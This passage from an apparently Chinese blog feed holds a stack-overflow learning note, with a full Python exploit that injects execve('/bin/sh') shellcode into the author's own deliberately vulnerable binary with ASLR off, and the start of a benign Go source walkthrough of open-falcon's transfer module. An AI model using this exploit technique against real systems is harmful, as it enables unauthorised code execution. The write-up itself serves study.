class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/sys</span><span class="regexp">/kernel/randomize</span>_va_space</span><br></pre></td></tr></table></figure><p>编译和打开栈执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -o vul1 vul1.c</span><br><span class="line">chmod +s vul1</span><br></pre></td></tr></table></figure><p>gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ gdb vul1 </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type "show copying"</span><br><span class="line">and "show warranty" for details.</span><br><span class="line">This GDB was configured as "i686-linux-gnu".</span><br><span class="line">Type "show configuration" for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type "help".</span><br><span class="line">Type "apropos word" to search for commands related to "word"...</span><br><span class="line">Reading symbols from vul1...done.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> dis</span></span><br><span class="line">disable      disassemble  disconnect   display      distance     </span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804844d &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x0804844e &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048453 &lt;+6&gt;:     sub    esp,0x110</span><br><span class="line">   0x08048459 &lt;+12&gt;:    mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x0804845c &lt;+15&gt;:    add    eax,0x4</span><br><span class="line">   0x0804845f &lt;+18&gt;:    mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08048461 &lt;+20&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048465 &lt;+24&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048469 &lt;+28&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804846c &lt;+31&gt;:    call   0x8048320 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048471 &lt;+36&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048475 &lt;+40&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048479 &lt;+44&gt;:    mov    DWORD PTR [esp],0x8048520</span><br><span class="line">   0x08048480 &lt;+51&gt;:    call   0x8048310 &lt;printf@plt&gt;</span><br><span class="line">   0x08048485 &lt;+56&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804848a &lt;+61&gt;:    leave  </span><br><span class="line">   0x0804848b &lt;+62&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r `python -c <span class="string">'print "A"*400'</span>`</span></span><br><span class="line">Starting program: /home/saar/pwn/vul1 `python -c 'print "A"*400'`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0xb7fc0000 --&gt; 0x1acda8 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fc1898 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41414141 ('AAAA')</span><br><span class="line">ESP: 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">EIP: 0x41414141 ('AAAA')</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">0004| 0xbffff464 ('A' &lt;repeats 124 times&gt;)</span><br><span class="line">0008| 0xbffff468 ('A' &lt;repeats 120 times&gt;)</span><br><span class="line">0012| 0xbffff46c ('A' &lt;repeats 116 times&gt;)</span><br><span class="line">0016| 0xbffff470 ('A' &lt;repeats 112 times&gt;)</span><br><span class="line">0020| 0xbffff474 ('A' &lt;repeats 108 times&gt;)</span><br><span class="line">0024| 0xbffff478 ('A' &lt;repeats 104 times&gt;)</span><br><span class="line">0028| 0xbffff47c ('A' &lt;repeats 100 times&gt;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br></pre></td></tr></table></figure><p>esp 地址是：0xbffff460，</p><p>发现ret_address需要保证esp+N&lt;nop的数目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff480</span>      </span><br><span class="line">              </span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">40</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vul1"</span>, buf])</span><br></pre></td></tr></table></figure><p>最后获取shell:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ python exp.py </span><br><span class="line">Calling vulnerable program</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="noopener">https://www.jianshu.com/p/187b810e78d2</a></p><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn学习笔记1&quot;&gt;&lt;a href=&quot;#pwn学习笔记1&quot; class=&quot;headerlink&quot; title=&quot;pwn学习笔记1&quot;&gt;&lt;/a&gt;pwn学习笔记1&lt;/h2&gt;&lt;h3 id=&quot;学习笔记&quot;&gt;&lt;a href=&quot;#学习笔记&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://www.mydreamdll.xyz/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://www.mydreamdll.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon transfer 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:46.621Z</published>
    <updated>2020-01-21T09:06:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-transfer-源码分析"><a href="#open-falcon-transfer-源码分析" class="headerlink" title="open-falcon transfer 源码分析"></a>open-falcon transfer 源码分析</h2><p>transfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。</p><p>主要流程在modules/transfer/main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">versionGit := flag.Bool(<span class="string">"vg"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *versionGit &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global config</span></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// proc</span></span><br><span class="line">    <span class="comment">// 就是打印日志。。orz</span></span><br><span class="line">proc.Start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送端启动</span></span><br><span class="line">sender.Start()</span><br><span class="line">    <span class="comment">// 接收数据启动</span></span><br><span class="line">receiver.Start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// http</span></span><br><span class="line">    <span class="comment">//  http服务启动</span></span><br><span class="line">http.Start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看下发送端的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化数据发送服务, 在main函数中调用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 初始化默认参数</span></span><br><span class="line">MinStep = g.Config().MinStep</span><br><span class="line"><span class="keyword">if</span> MinStep &lt; <span class="number">1</span> &#123;</span><br><span class="line">MinStep = <span class="number">30</span> <span class="comment">//默认30s</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化连接池</span></span><br><span class="line">initConnPools()</span><br><span class="line">    <span class="comment">//初始化发送队列</span></span><br><span class="line">initSendQueues()</span><br><span class="line"><span class="comment">//初始化hash环，用于做一致性hash分片</span></span><br><span class="line">    initNodeRings()</span><br><span class="line"><span class="comment">// SendTasks依赖基础组件的初始化,要最后启动</span></span><br><span class="line">startSendTasks()</span><br><span class="line">    <span class="comment">//启动发送定时任务</span></span><br><span class="line">startSenderCron()</span><br><span class="line">log.Println(<span class="string">"send.Start, ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initConnPools</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line"><span class="comment">// judge</span></span><br><span class="line">    <span class="comment">// 读取配置文件，加载进来</span></span><br><span class="line">judgeInstances := nset.NewStringSet()</span><br><span class="line"><span class="keyword">for</span> _, instance := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">judgeInstances.Add(instance)</span><br><span class="line">&#125;</span><br><span class="line">JudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle,</span><br><span class="line">cfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice())</span><br><span class="line"></span><br><span class="line"><span class="comment">// tsdb，是否开启tsdb，初始化</span></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">TsdbConnPoolHelper = backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// graph</span></span><br><span class="line">    <span class="comment">// graph地址初始化</span></span><br><span class="line">graphInstances := nset.NewSafeSet()</span><br><span class="line"><span class="keyword">for</span> _, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">graphInstances.Add(addr)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">GraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle,</span><br><span class="line">cfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化发送队列：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initSendQueues</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line">    <span class="comment">// 对每个judge节点构建一个队列</span></span><br><span class="line"><span class="keyword">for</span> node := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">JudgeQueues[node] = Q</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对每个graph节点构建一个队列</span></span><br><span class="line"><span class="keyword">for</span> node, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">GraphQueues[node+addr] = Q</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对tsdb节点构建队列</span></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">TsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNodeRings构建hash环，用于一致性hash初始化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initNodeRings</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line">JudgeNodeRing = rings.NewConsistentHashNodesRing(<span class="keyword">int32</span>(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster))</span><br><span class="line">GraphNodeRing = rings.NewConsistentHashNodesRing(<span class="keyword">int32</span>(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startSendTasks函数启动发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO 添加对发送任务的控制,比如stop等</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startSendTasks</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"><span class="comment">// init semaphore</span></span><br><span class="line">judgeConcurrent := cfg.Judge.MaxConns</span><br><span class="line">graphConcurrent := cfg.Graph.MaxConns</span><br><span class="line">tsdbConcurrent := cfg.Tsdb.MaxConns</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tsdbConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">tsdbConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judgeConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">judgeConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> graphConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">graphConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// init send go-routines</span></span><br><span class="line"><span class="keyword">for</span> node := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">queue := JudgeQueues[node]</span><br><span class="line"><span class="keyword">go</span> forward2JudgeTask(queue, node, judgeConcurrent)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">queue := GraphQueues[node+addr]</span><br><span class="line"><span class="keyword">go</span> forward2GraphTask(queue, node, addr, graphConcurrent)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line"><span class="keyword">go</span> forward2TsdbTask(tsdbConcurrent)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forward2JudgeTask函数用于启动judge发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judge</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2JudgeTask</span><span class="params">(Q *list.SafeListLimited, node <span class="keyword">string</span>, concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Judge.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">addr := g.Config().Judge.Cluster[node]</span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := Q.PopBackBy(batch)</span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">judgeItems := <span class="built_in">make</span>([]*cmodel.JudgeItem, count)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">judgeItems[i] = items[i].(*cmodel.JudgeItem)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同步Call + 有限并发 进行发送</span></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(addr <span class="keyword">string</span>, judgeItems []*cmodel.JudgeItem, count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line">resp := &amp;cmodel.SimpleRpcResponse&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">sendOk := <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123; <span class="comment">//最多重试3次</span></span><br><span class="line">                <span class="comment">// 调用judge rpc send接口发送数据</span></span><br><span class="line">err = JudgeConnPools.Call(addr, <span class="string">"Judge.Send"</span>, judgeItems, resp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sendOk = <span class="literal">true</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Millisecond * <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line"><span class="keyword">if</span> !sendOk &#123;</span><br><span class="line">log.Printf(<span class="string">"send judge %s:%s fail: %v"</span>, node, addr, err)</span><br><span 